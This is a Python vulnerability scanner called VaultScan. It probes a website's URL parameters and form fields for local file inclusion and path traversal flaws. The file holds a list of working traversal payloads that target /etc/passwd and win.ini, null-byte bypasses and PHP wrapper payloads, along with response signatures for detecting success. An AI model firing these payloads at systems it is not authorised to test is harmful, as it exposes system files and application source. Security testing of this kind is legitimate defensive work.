#!/usr/bin/env python3
"""
VaultScan - Local File Inclusion / Directory Traversal Scanner
==============================================================
Tests URL parameters and form inputs for LFI and path traversal
vulnerabilities using Linux/Windows traversal payloads, null byte
injection, and PHP wrapper techniques. Crawls same-domain pages
(depth-1, max 8) and prioritises file-related parameter names.

Outputs JSON array of findings to stdout.
"""

import re
import sys
import os
import base64
import time
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from scan_utils import (
    is_mock_mode,
    output_findings,
    output_error,
    base_argparser,
    normalize_url,
    create_session,
    safe_request,
    rate_limited_request,
    make_finding,
    extract_forms,
    extract_url_params,
    replace_url_param,
    crawl_same_domain,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
CATEGORY = "LFI"
MAX_CRAWL_PAGES = 5
TESTABLE_INPUT_TYPES = {"text", "search", "hidden", "password", "url", "tel", "number"}

# Parameter names that commonly accept file paths
FILE_PARAM_NAMES = {
    "file", "path", "page", "include", "doc", "document", "folder", "root",
    "pg", "style", "pdf", "template", "php_path", "name", "url", "dir",
    "show", "nav", "site", "load", "read", "content", "layout", "mod",
    "conf",
}

# ---------------------------------------------------------------------------
# Path Traversal Payloads (24)
# ---------------------------------------------------------------------------
LFI_PAYLOADS: List[Tuple[str, str]] = [
    # (payload, target_os)
    # --- Linux: /etc/passwd ---
    ("../../../../etc/passwd", "linux"),
    ("../../../../../etc/passwd", "linux"),
    ("../../../../../../etc/passwd", "linux"),
    ("....//....//....//....//etc/passwd", "linux"),
    ("..%2f..%2f..%2f..%2fetc/passwd", "linux"),
    ("..%252f..%252f..%252f..%252fetc/passwd", "linux"),
    ("....%5c/....%5c/....%5c/etc/passwd", "linux"),
    ("/etc/passwd", "linux"),
    ("%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "linux"),
    (r"....\/....\/....\/etc/passwd", "linux"),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "linux"),
    # --- Windows: win.ini ---
    ("..\\..\\..\\..\\windows\\win.ini", "windows"),
    ("..%5c..%5c..%5c..%5cwindows\\win.ini", "windows"),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini", "windows"),
    ("..\\..\\..\\..\\..\\windows\\win.ini", "windows"),
    ("/windows/win.ini", "windows"),
    # --- Null byte bypasses ---
    ("../../../../etc/passwd%00", "linux"),
    ("../../../../etc/passwd%00.jpg", "linux"),
    ("../../../../etc/passwd%00.html", "linux"),
    ("..\\..\\..\\..\\windows\\win.ini%00", "windows"),
    # --- PHP wrappers ---
    ("php://filter/convert.base64-encode/resource=index", "php"),
    ("php://filter/convert.base64-encode/resource=config", "php"),
    ("php://input", "php"),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "php"),
]

# ---------------------------------------------------------------------------
# File Content Signatures
# ---------------------------------------------------------------------------
LINUX_PASSWD_SIGNATURES = [
    r"root:x:0:0",
    r"root:\*:0:0",
    r"daemon:x:\d+:\d+",
    r"bin:x:\d+:\d+",
    r"nobody:x:",
    r"[a-z_][a-z0-9_-]*:x:\d+:\d+:",  # generic passwd line
]

WINDOWS_INI_SIGNATURES = [
    r"\[fonts\]",
    r"\[extensions\]",
    r"\[mci extensions\]",
    r"\[Mail\]",
]

WINDOWS_BOOT_SIGNATURES = [
    r"\[boot loader\]",
    r"\[operating systems\]",
]

# Patterns suggesting a failed include / path-based error (HIGH, not CRITICAL)
PATH_ERROR_PATTERNS = [
    r"No such file or directory",
    r"failed to open stream",
    r"include\(.*?\).*?failed",
    r"require\(.*?\).*?failed",
    r"include_once\(.*?\).*?failed",
    r"fopen\(.*?\).*?failed",
    r"open_basedir restriction",
    r"Permission denied",
    r"not found or unable to stat",
    r"Warning.*?file_get_contents",
    r"Warning.*?readfile",
    r"Warning.*?fread",
    r"java\.io\.FileNotFoundException",
    r"System\.IO\.FileNotFoundException",
]

# Regex to detect base64-encoded content (PHP filter output)
BASE64_PATTERN = re.compile(r"^[A-Za-z0-9+/]{60,}={0,2}$", re.MULTILINE)


# ---------------------------------------------------------------------------
# Detection Helpers
# ---------------------------------------------------------------------------
def _check_file_content(body: str, payload: str, target_os: str) -> Optional[Tuple[str, str]]:
    """
    Check response body for file content signatures.
    Returns (vulnerability_detail, severity) or None.
    """
    # Linux passwd
    if target_os in ("linux",):
        for sig in LINUX_PASSWD_SIGNATURES:
            if re.search(sig, body):
                return ("Linux /etc/passwd contents detected", "CRITICAL")

    # Windows win.ini
    if target_os in ("windows",):
        for sig in WINDOWS_INI_SIGNATURES:
            if re.search(sig, body, re.IGNORECASE):
                return ("Windows win.ini contents detected", "CRITICAL")
        for sig in WINDOWS_BOOT_SIGNATURES:
            if re.search(sig, body, re.IGNORECASE):
                return ("Windows boot.ini contents detected", "CRITICAL")

    # PHP filter base64 output
    if target_os == "php" and "php://filter" in payload:
        if BASE64_PATTERN.search(body):
            # Validate it decodes to something meaningful
            for match in BASE64_PATTERN.finditer(body):
                try:
                    decoded = base64.b64decode(match.group(0)).decode("utf-8", errors="ignore")
                    if len(decoded) > 20 and ("<" in decoded or "php" in decoded.lower()):
                        return ("PHP source code disclosed via php://filter", "CRITICAL")
                except Exception:
                    pass

    return None


def _check_path_errors(body: str) -> Optional[str]:
    """
    Check response body for path-related error messages that indicate
    traversal is being processed but the file was not found.
    Returns the matched error text or None.
    """
    for pattern in PATH_ERROR_PATTERNS:
        m = re.search(pattern, body, re.IGNORECASE)
        if m:
            return m.group(0)
    return None


def _prioritise_params(params: Dict[str, List[str]]) -> List[Tuple[str, str]]:
    """
    Sort parameters so file-like names come first.
    Returns list of (param_name, original_value).
    """
    priority = []
    others = []
    for name, values in params.items():
        val = values[0] if values else ""
        if name.lower() in FILE_PARAM_NAMES:
            priority.append((name, val))
        else:
            others.append((name, val))
    return priority + others


# ---------------------------------------------------------------------------
# Test URL Parameters
# ---------------------------------------------------------------------------
def test_url_params(
    session,
    url: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """Test each URL query parameter for LFI using all payloads."""
    findings: List[Dict] = []
    params = extract_url_params(url)
    if not params:
        return findings

    sorted_params = _prioritise_params(params)

    for param_name, original_value in sorted_params:
        found_critical = False

        for payload, target_os in LFI_PAYLOADS:
            test_url = replace_url_param(url, param_name, payload)
            resp, err = rate_limited_request(
                session, "GET", test_url, delay=delay, timeout=timeout,
            )
            if err or resp is None:
                continue

            body = resp.text

            # Check for actual file content (CRITICAL)
            detection = _check_file_content(body, payload, target_os)
            if detection:
                detail, severity = detection
                findings.append(make_finding(
                    vulnerability=f"Local File Inclusion — {detail}",
                    severity=severity,
                    location=f"{url} [param: {param_name}]",
                    evidence=(
                        f"Payload '{payload}' in parameter '{param_name}' "
                        f"returned file contents: {detail}"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "path-traversal",
                        "parameter": param_name,
                        "payload": payload,
                        "target_os": target_os,
                        "detection": detail,
                        "status_code": resp.status_code,
                    },
                ))
                found_critical = True
                break  # One critical per param is enough

            # Check for path error messages (HIGH)
            if not found_critical:
                error_text = _check_path_errors(body)
                if error_text:
                    findings.append(make_finding(
                        vulnerability="Potential Path Traversal — Error Disclosure",
                        severity="HIGH",
                        location=f"{url} [param: {param_name}]",
                        evidence=(
                            f"Payload '{payload}' in parameter '{param_name}' "
                            f"triggered path error: {error_text[:150]}"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "path-error",
                            "parameter": param_name,
                            "payload": payload,
                            "target_os": target_os,
                            "error_text": error_text[:300],
                            "status_code": resp.status_code,
                        },
                    ))
                    found_critical = True  # Prevent duplicate HIGH per param
                    break

    return findings


# ---------------------------------------------------------------------------
# Test Forms
# ---------------------------------------------------------------------------
def test_forms(
    session,
    url: str,
    html: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """Test form inputs for LFI vulnerabilities."""
    findings: List[Dict] = []
    forms = extract_forms(url, html)

    for form in forms:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        for inp in inputs:
            inp_type = inp.get("type", "text").lower()
            if inp_type not in TESTABLE_INPUT_TYPES:
                continue

            inp_name = inp["name"]

            # Prioritise file-like field names, but test all
            is_file_param = inp_name.lower() in FILE_PARAM_NAMES

            # Build base form data
            base_data: Dict[str, str] = {}
            for other in inputs:
                if other["name"] == inp_name:
                    continue
                base_data[other["name"]] = other.get("value", "") or "test"

            found_vuln = False

            # Only test a subset of payloads for non-file params to save time
            payloads_to_test = LFI_PAYLOADS if is_file_param else LFI_PAYLOADS[:12]

            for payload, target_os in payloads_to_test:
                form_data = {**base_data, inp_name: payload}

                if method == "POST":
                    resp, err = rate_limited_request(
                        session, "POST", action, delay=delay, timeout=timeout,
                        data=form_data,
                    )
                else:
                    resp, err = rate_limited_request(
                        session, "GET", action, delay=delay, timeout=timeout,
                        params=form_data,
                    )

                if err or resp is None:
                    continue

                body = resp.text

                # Check for file content (CRITICAL)
                detection = _check_file_content(body, payload, target_os)
                if detection:
                    detail, severity = detection
                    findings.append(make_finding(
                        vulnerability=f"Local File Inclusion in Form — {detail}",
                        severity=severity,
                        location=f"{action} [form field: {inp_name}]",
                        evidence=(
                            f"Payload '{payload}' in form field '{inp_name}' "
                            f"({method}) returned file contents: {detail}"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "path-traversal-form",
                            "form_action": action,
                            "form_method": method,
                            "field": inp_name,
                            "payload": payload,
                            "target_os": target_os,
                            "detection": detail,
                            "status_code": resp.status_code,
                        },
                    ))
                    found_vuln = True
                    break

                # Check for path errors (HIGH)
                error_text = _check_path_errors(body)
                if error_text:
                    findings.append(make_finding(
                        vulnerability="Potential Path Traversal in Form — Error Disclosure",
                        severity="HIGH",
                        location=f"{action} [form field: {inp_name}]",
                        evidence=(
                            f"Payload '{payload}' in form field '{inp_name}' "
                            f"({method}) triggered path error: {error_text[:150]}"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "path-error-form",
                            "form_action": action,
                            "form_method": method,
                            "field": inp_name,
                            "payload": payload,
                            "target_os": target_os,
                            "error_text": error_text[:300],
                            "status_code": resp.status_code,
                        },
                    ))
                    found_vuln = True
                    break

            if found_vuln:
                continue  # Move on to next input

    return findings


# ---------------------------------------------------------------------------
# Mock Findings
# ---------------------------------------------------------------------------
def get_mock_findings(target: str) -> List[Dict]:
    """Return realistic mock findings for demonstration/testing."""
    return [
        make_finding(
            vulnerability="Local File Inclusion — Linux /etc/passwd contents detected",
            severity="CRITICAL",
            location=f"{target}/view?file=report.pdf [param: file]",
            evidence=(
                "Payload '../../../../etc/passwd' in parameter 'file' "
                "returned file contents: Linux /etc/passwd contents detected"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "path-traversal",
                "parameter": "file",
                "payload": "../../../../etc/passwd",
                "target_os": "linux",
                "detection": "Linux /etc/passwd contents detected",
                "status_code": 200,
            },
        ),
        make_finding(
            vulnerability="Local File Inclusion — PHP source code disclosed via php://filter",
            severity="CRITICAL",
            location=f"{target}/index.php?page=home [param: page]",
            evidence=(
                "Payload 'php://filter/convert.base64-encode/resource=index' "
                "in parameter 'page' returned file contents: "
                "PHP source code disclosed via php://filter"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "path-traversal",
                "parameter": "page",
                "payload": "php://filter/convert.base64-encode/resource=index",
                "target_os": "php",
                "detection": "PHP source code disclosed via php://filter",
                "status_code": 200,
            },
        ),
        make_finding(
            vulnerability="Potential Path Traversal — Error Disclosure",
            severity="HIGH",
            location=f"{target}/download?path=docs/manual.pdf [param: path]",
            evidence=(
                "Payload '....//....//....//....//etc/passwd' in parameter "
                "'path' triggered path error: failed to open stream: "
                "No such file or directory"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "path-error",
                "parameter": "path",
                "payload": "....//....//....//....//etc/passwd",
                "target_os": "linux",
                "error_text": "failed to open stream: No such file or directory",
                "status_code": 200,
            },
        ),
    ]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = base_argparser("VaultScan - Local File Inclusion / Directory Traversal Scanner")
    args = parser.parse_args()

    target = normalize_url(args.target)

    # ---- Mock mode ----
    if is_mock_mode():
        output_findings(get_mock_findings(target))
        return

    # ---- Live scan ----
    session = create_session(timeout=args.timeout, cookies=args.cookies, headers=args.headers)
    delay = args.delay
    timeout = args.timeout
    findings: List[Dict] = []

    # Step 1: Crawl same-domain pages (depth-1, max 8)
    try:
        pages = crawl_same_domain(
            target, session, delay=delay, timeout=timeout, max_pages=MAX_CRAWL_PAGES,
            depth=args.crawl_depth,
        )
    except Exception:
        pages = [target]

    # Step 2: Test each discovered page
    for page_url in pages:
        # Fetch page HTML for form extraction
        resp, err = safe_request(session, "GET", page_url, timeout=timeout)
        page_html = resp.text if resp else ""

        # 2a: Test URL parameters
        findings.extend(test_url_params(session, page_url, delay, timeout))

        # 2b: Test forms
        if page_html:
            findings.extend(test_forms(session, page_url, page_html, delay, timeout))

    # Deduplicate by (vulnerability, location)
    seen = set()
    unique_findings: List[Dict] = []
    for f in findings:
        key = (f["vulnerability"], f["location"])
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    output_findings(unique_findings)


if __name__ == "__main__":
    main()
